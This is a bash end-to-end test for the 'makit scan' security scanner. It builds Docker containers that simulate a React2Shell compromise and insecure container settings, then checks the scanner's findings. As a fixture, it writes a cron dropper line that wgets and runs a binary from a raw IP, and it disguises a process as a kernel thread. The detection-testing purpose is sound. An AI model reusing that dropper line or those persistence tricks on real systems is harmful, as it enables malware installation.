#!/usr/bin/env bash
# End-to-end test of `makit scan` against a simulated React2Shell compromise (no real malware, no traffic to bad IPs):
#   tests/scan-e2e.sh        (needs Docker; builds makit-core first)
# The victim container runs a copy of `sleep` as /tmp/vim under the name [kworker/0:1] and deletes the file, hides a Go
# network binary in /tmp/.x/kworker, adds a dropper cron job and installs next@16.0.4. The scanner runs from a second
# container sharing the host PID namespace, exactly like `sudo makit scan --container …` on a server.
# shellcheck disable=SC2016,SC2034,SC2329 # checks are strings evaluated by check()
set -euo pipefail
cd "$(dirname "$0")/.."
case "$(uname -m)" in x86_64|amd64) arch=amd64 ;; *) arch=arm64 ;; esac
[[ -x dist/makit-core-linux-$arch ]] || scripts/build.sh >/dev/null
bin="$PWD/dist/makit-core-linux-$arch"
victim=makit-e2e-victim
bad=makit-e2e-misconfigured
cleanup() { docker rm -f "$victim" "$bad" >/dev/null 2>&1 || true; }
trap cleanup EXIT
cleanup

docker run -d --name "$victim" -w /app -v "$bin:/seed/gobin:ro" debian:12 bash -c '
  mkdir -p /app/node_modules/next /tmp/.x /etc/cron.d
  echo "{\"name\":\"next\",\"version\":\"16.0.4\"}" > /app/node_modules/next/package.json
  cp /seed/gobin /tmp/.x/kworker && chmod +x /tmp/.x/kworker
  echo "* * * * * root wget http://45.76.155.14/vim -O /tmp/vim; chmod +x /tmp/vim; nohup /tmp/vim >/dev/null 2>&1 &" > /etc/cron.d/sysupdate
  cp /bin/sleep /tmp/vim && chmod +x /tmp/vim
  (exec -a "[kworker/0:1]" /tmp/vim 3600 >/dev/null 2>&1 &)
  sleep 1; rm -f /tmp/vim
  exec sleep infinity' >/dev/null
# A container with the configuration mistakes posture checks look for (it only sleeps).
docker run -d --name "$bad" --privileged -v /var/run/docker.sock:/var/run/docker.sock -p 0.0.0.0:15432:5432 \
  debian:12 sleep infinity >/dev/null
sleep 3

scan() {
  docker run --rm --pid=host --privileged -v /var/run/docker.sock:/var/run/docker.sock \
    -v "$bin:/opt/makit/libexec/makit-core:ro" -v "$PWD/security:/opt/makit/security:ro" \
    debian:12 /opt/makit/libexec/makit-core scan "$@"
}

fail=0
check() { if eval "$2"; then echo "  ✓ $1"; else echo "  ✗ $1"; fail=1; fi; }

echo "consent"
set +e; scan --container "$victim" </dev/null >/dev/null 2>&1; code=$?; set -e
check "refuses to scan without consent (exit 3)" '[[ $code -eq 3 ]]'

echo "detections"
set +e; report=$(scan --container "$victim" --container "$bad" --consent --json 2>/dev/null); code=$?; set -e
check "exit 1 when MEDIUM or worse is found" '[[ $code -eq 1 ]]'
has() { python3 -c 'import json,sys; r=json.load(sys.stdin); sys.exit(0 if any(f["rule"]==sys.argv[1] and f["path"]==sys.argv[2] and f["severity"]==sys.argv[3] for f in r["findings"]) else 1)' "$@" <<<"$report"; }
check "deleted /tmp/vim still running → CRITICAL"             'has MK-PROC-DELETED-TEMP /tmp/vim CRITICAL'
check "process disguised as [kworker/0:1] → HIGH"             'has MK-PROC-KTHREAD /tmp/vim HIGH'
check "known React2Shell path /tmp/vim → CRITICAL"            'has MK-R2S /tmp/vim CRITICAL'
check "hidden Go network binary /tmp/.x/kworker → HIGH"       'has MK-FILE-EXEC-HIDDEN /tmp/.x/kworker HIGH'
check "dropper cron job → HIGH"                               'has MK-DROPPER /etc/cron.d/sysupdate HIGH'
check "cron runs from /tmp → HIGH"                            'has MK-PERSIST-TEMP-EXEC /etc/cron.d/sysupdate HIGH'
check "next 16.0.4 affected by CVE-2025-55182 → CRITICAL"     'has MK-VULN /app/node_modules/next/package.json CRITICAL'
hasT() { python3 -c 'import json,sys; r=json.load(sys.stdin); sys.exit(0 if any(f["rule"]==sys.argv[1] and f["target"]==sys.argv[2] and f["severity"]==sys.argv[3] for f in r["findings"]) else 1)' "$@" <<<"$report"; }
echo "container configuration"
check "privileged container → CRITICAL"                       'hasT MK-DOCKER-PRIVILEGED container:$bad CRITICAL'
check "docker.sock mounted → CRITICAL"                        'hasT MK-DOCKER-SOCK container:$bad CRITICAL'
check "Postgres port published on 0.0.0.0 → HIGH"             'hasT MK-NET-PUBLIC-SERVICE container:$bad HIGH'
check "main process runs as root → MEDIUM"                    'hasT MK-DOCKER-ROOT container:$bad MEDIUM'
check "/tmp writable and executable → MEDIUM"                 'hasT MK-DOCKER-TMP-EXEC container:$bad MEDIUM'
check "every finding links its documentation" 'python3 -c "import json,sys; f=json.load(sys.stdin)[\"findings\"]; sys.exit(0 if f and all(\"/docs/security/\" in x.get(\"doc\",\"\") for x in f) else 1)" <<<"$report"'
check "report lists the catalog used" 'python3 -c "import json,sys; sys.exit(0 if json.load(sys.stdin)[\"catalog\"] else 1)" <<<"$report"'

echo "read-only"
before=$(docker diff "$victim" | sort)
scan --container "$victim" --consent >/dev/null 2>&1 || true
after=$(docker diff "$victim" | sort)
check "the scanned container is unchanged" '[[ "$before" == "$after" ]]'

exit $fail
